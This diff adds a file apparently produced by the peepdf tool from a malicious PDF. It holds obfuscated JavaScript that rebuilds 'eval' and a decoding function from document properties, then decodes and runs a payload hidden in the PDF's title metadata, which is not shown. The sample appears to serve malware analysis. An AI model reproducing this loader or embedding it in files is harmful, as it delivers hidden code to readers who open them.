@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [(test) <</S /JavaScript
+/JS (
+NuziDap='';
+TusiqyjopuhocixQora=2011;
+var j = TusiqyjopuhocixQora-2007;
+QimmoliLeamow='2011s'.replace(TusiqyjopuhocixQora,'hi');
+KokyPusojefiwuzed=('.tit2011').replace(TusiqyjopuhocixQora,'le');
+eval('RezaldymQojazaqu=t'+QimmoliLeamow+KokyPusojefiwuzed);
+ZhiVhcapujotul=('sub2011').replace(TusiqyjopuhocixQora,'ject');
+eval('Welegihyabe=t'+QimmoliLeamow+'.'+ZhiVhcapujotul);
+Welegihyabe=Welegihyabe.replace(TusiqyjopuhocixQora,'al');
+eval('FovepI=t'+QimmoliLeamow);
+eval('QerabojorovJyesa=FovepI[Welegihyabe]');
+WuluzwuSow='.pro2011cer';
+WuluzwuSow=QerabojorovJyesa('WuluzwuSow.replace(TusiqyjopuhocixQora,"du")');
+eval('WyxenIbisy=t'+QimmoliLeamow+WuluzwuSow);
+MinihetFyv=QerabojorovJyesa(WyxenIbisy);
+MbeGud = RezaldymQojazaqu.split(',');
+for (KowIz = 0; KowIz < MbeGud.length; KowIz++) {
+	Koryabevkor = QerabojorovJyesa(MbeGud[KowIz]);
+	NuziDap += MinihetFyv(Koryabevkor);
+}
+QerabojorovJyesa(NuziDap);
+
+)
+>>]
+>>
+
